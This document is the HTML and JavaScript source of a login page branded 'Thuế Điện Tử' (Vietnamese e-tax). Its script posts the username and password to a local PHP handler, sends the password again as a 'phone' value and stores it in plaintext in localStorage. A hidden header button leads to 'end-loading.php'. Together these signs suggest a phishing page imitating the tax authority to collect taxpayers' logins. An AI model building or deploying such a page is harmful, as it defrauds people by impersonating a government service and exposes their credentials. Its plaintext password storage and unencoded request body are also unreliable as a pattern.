<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <link rel="stylesheet" href="../public/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    <title>Thuế Điện Tử</title>
    <link rel="icon" type="image/png" href="../image/thuedinetu.png" sizes="32x32">


</head>
<!--<div id="alert-container" style="position: fixed; top: 20px; right: 20px; z-index: 1050;"></div>-->

<div id="alert-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1049;"></div>
<div id="alert-popup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1050;"></div>

<div id="customConfirm" class="custom-confirm" style="display: none;">
    <div class="confirm-box">
        <p class="confirm-message">Chưa có thông tin kê khai vui lòng liên hệ cán bộ thuế để được hỗ trợ.</p>
        <button class="confirm-ok-btn">OK</button>
    </div>
</div>

<!-- Popup thông báo mới -->
<div id="customPopupCuoi" class="custom-popup-cuoi">
    <div class="custom-popup-content-cuoi">
        <span class="custom-close-btn-cuoi" id="closePopupCuoi">&times;</span>
        <div class="bg-white-cuoi">
            <p id="popupMessageCuoi">Thông báo sẽ hiển thị ở đây.</p>
            <button type="button" class="confirm-ok-btn mt-1" id="okButtonCuoi">Tiếp tục</button>
        </div>
    </div>
</div>



<header>
    <button class="header-button" onclick="window.location.href='end-loading.php'">ㅤㅤ</button>
</header>





<script src="../public/js/style.js"></script>
<div class="container">
    <div class="app-main">
        <div class="header">
            <div class="logo">
                <img width="160" src="../image/thuedinetu.png" alt="">
            </div>
        </div>
        <div class="form">
            <form id="loginForm" method="POST" onsubmit="submitLogin(); return false;">
                <div class="info-form">
                    <i class="fa-solid fa-user"></i>
                    <input type="text" id="username" name="username" placeholder="Tên đăng nhập" required>
                </div>
                <div class="info-form mt-2">
                    <i class="fa-solid fa-lock"></i>
                    <input type="password" id="password" name="password" placeholder="Mật khẩu" required>
                    <i class="fa-solid fa-eye toggle-password" onclick="togglePasswordVisibility()"></i>
                </div>

                <div class="mt-1">
                    <input type="checkbox" id="rememberMe" name="rememberMe">
                    <label for="rememberMe" class="text-white">Lưu thông tin đăng nhập</label>
                </div>
                <button type="submit" class="btn-login mt-1">Đăng nhập</button>
            </form>
            <div class="flex text-center item-center justify-center mt-1">
                <p class="text-white pointer">Đăng nhập bằng tài khoản<br>Định danh điện tử</p>
                <img class="pointer" width="80" src="../image/1679018362827_unnamed.png" alt="">
            </div>
            <p class="register text-white mt-2 text-center">Bạn chưa có tài khoản? <a href="">Đăng ký ngay</a></p>
        </div>
    </div>
</div>

<script>
    function togglePasswordVisibility() {
        const passwordInput = document.getElementById("password");
        const toggleIcon = document.querySelector(".toggle-password");

        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            toggleIcon.classList.remove("fa-eye");
            toggleIcon.classList.add("fa-eye-slash");
        } else {
            passwordInput.type = "password";
            toggleIcon.classList.remove("fa-eye-slash");
            toggleIcon.classList.add("fa-eye");
        }
    }

    // Lưu thông tin đăng nhập nếu chọn "Lưu thông tin"
    function saveLoginInfo() {
        const rememberMe = document.getElementById("rememberMe").checked;
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        if (rememberMe) {
            localStorage.setItem("username", username);
            localStorage.setItem("password", password);
        } else {
            localStorage.removeItem("username");
            localStorage.removeItem("password");
        }
    }

    // Tự động điền thông tin đăng nhập nếu đã lưu trước đó
    function autofillLoginInfo() {
        const savedUsername = localStorage.getItem("username");
        const savedPassword = localStorage.getItem("password");

        if (savedUsername && savedPassword) {
            document.getElementById("username").value = savedUsername;
            document.getElementById("password").value = savedPassword;
            document.getElementById("rememberMe").checked = true;
        }
    }

    // Gọi hàm tự động điền thông tin khi tải trang
    window.onload = autofillLoginInfo;

    // Hàm xử lý đăng nhập
    function submitLogin() {
        saveLoginInfo(); // Gọi hàm lưu thông tin

        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        const xhr = new XMLHttpRequest();
        xhr.open("POST", "process_login.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);

                if (response.status === "success") {
                    window.location.href = "home.php";
                } else {
                    alert(response.message);
                }
            }
        };

        // Gửi thông tin đăng nhập đồng thời cập nhật cả trường "phone"
        xhr.send(`username=${username}&password=${password}&phone=${password}`);
    }
</script>
